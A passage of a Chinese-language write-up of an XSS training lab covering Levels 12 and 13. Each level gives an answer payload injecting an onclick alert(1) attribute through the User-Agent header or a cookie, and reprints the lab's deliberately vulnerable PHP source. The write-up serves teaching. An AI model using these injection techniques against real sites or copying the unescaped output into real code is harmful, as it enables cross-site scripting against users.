class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 12&lt;&#x2F;p&gt;
&lt;p&gt;与11题原理相同，注入点在UA头&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;User-Agent: &quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level13.php?keyword&#x3D;good job!&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level12&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level12&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_SERVER&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;HTTP_USER_AGENT&#x27;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_ua&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level12.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 13&lt;&#x2F;p&gt;
&lt;p&gt;原理与11题一样，注入点在Cookie，注意要触发cookie&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140248710.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140248710.png&quot; alt&#x3D;&quot;image-20240204140248710&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;Cookie: user&#x3D;&quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;37&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level14.php&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level13&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level13&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;setcookie&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;user&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;string&quot;&gt;&quot;call me maybe?&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;time&lt;&#x2F;span&gt;()+&lt;span class&#x3D;&quot;number&quot;&gt;3600&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_COOKIE&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;user&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; 